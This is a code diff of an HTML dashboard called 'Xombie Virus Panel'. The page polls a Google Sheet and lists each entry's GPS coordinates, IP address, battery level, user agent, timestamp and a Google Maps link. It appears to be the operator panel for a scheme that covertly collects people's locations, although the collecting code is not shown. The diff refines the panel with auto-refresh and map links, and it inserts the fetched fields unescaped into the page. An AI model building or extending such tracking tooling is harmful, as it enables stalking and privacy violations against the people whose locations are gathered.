@@ -1,65 +1,48 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Xombie Virus Panel</title>
+  <meta charset="UTF-8" />
+  <title>Xombie Panel with Working Map</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #000;
-      color: #0ff;
-      padding: 20px;
-    }
-    h1 {
-      color: #fff;
-      text-align: center;
-    }
-    .entry {
-      border: 2px solid #0ff;
-      padding: 15px;
-      margin: 10px 0;
-      border-radius: 10px;
-      background: #111;
-    }
+    body { background:#000; color:#0ff; font-family: monospace; padding:20px;}
+    .entry {border:2px solid #0ff; margin:10px; padding:10px; border-radius:8px;}
+    a {color:#0ff; text-decoration:none;}
   </style>
 </head>
 <body>
-  <h1>📍 XombieVirus Panel (Live KFC Data)</h1>
-  <div id="data"></div>
+  <h1>📍 Live Location Panel</h1>
+  <div id="panel"></div>
 
-<script>
-  async function loadData() {
-    const sheetURL = 'https://opensheet.elk.sh/169KNrSyMEwmVJAHsMVTIGmevUvHjFrgr2-424nMEwhc/Sheet1';
-    const res = await fetch(sheetURL);
-    const data = await res.json();
-
-    // Optional: Console check
-    console.log(data);
-
-    // Yahan apni panel ki display logic likho, for example:
-    const container = document.getElementById("location-data");
-    data.forEach(entry => {
-      const card = document.createElement("div");
-      card.className = "entry-card";
-      card.innerHTML = `
-        <p><strong>Latitude:</strong> ${entry.Latitude}</p>
-        <p><strong>Longitude:</strong> ${entry.Longitude}</p>
-        <p><strong>Accuracy:</strong> ${entry.Accuracy}</p>
-        <p><strong>IP:</strong> ${entry.IP}</p>
-        <p><strong>Battery:</strong> ${entry.Battery}</p>
-        <p><strong>UserAgent:</strong> ${entry.UserAgent}</p>
-        <p><strong>Time:</strong> ${entry.Time}</p>
-        <hr/>
-      `;
-      container.appendChild(card);
-    });
-  }
-
-  // Load data on page load
-  window.onload = loadData;
-</script>
+  <script>
+    async function loadSheet() {
+      const url = 'https://opensheet.elk.sh/169KNrSyMEwmVJAHsMVTIGmevUvHjFrgr2-424nMEwhc/Sheet1';
+      try {
+        const res = await fetch(url);
+        const data = await res.json();
+        const container = document.getElementById('panel');
+        container.innerHTML = '';
+        data.reverse().forEach(row => {
+          const entry = document.createElement('div');
+          entry.className = 'entry';
+          entry.innerHTML = `
+            <p><strong>Lat:</strong> ${row.Latitude}</p>
+            <p><strong>Lon:</strong> ${row.Longitude}</p>
+            <p><strong>Accuracy:</strong> ${row.Accuracy}</p>
+            <p><strong>IP:</strong> ${row.IP}</p>
+            <p><strong>Battery:</strong> ${row.Battery}</p>
+            <p><strong>UserAgent:</strong> ${row.UserAgent}</p>
+            <p><a href="${row.Map}" target="_blank">📍 View on Google Maps</a></p>
+            <p><strong>Time:</strong> ${row.Time}</p>
+          `;
+          container.appendChild(entry);
+        });
+      } catch (e) {
+        document.getElementById('panel').innerText = '⚠️ Error loading data';
+        console.error(e);
+      }
+    }
+    loadSheet();
+    setInterval(loadSheet, 15000);
+  </script>
 </body>
 </html>
-(No Title)
-
-
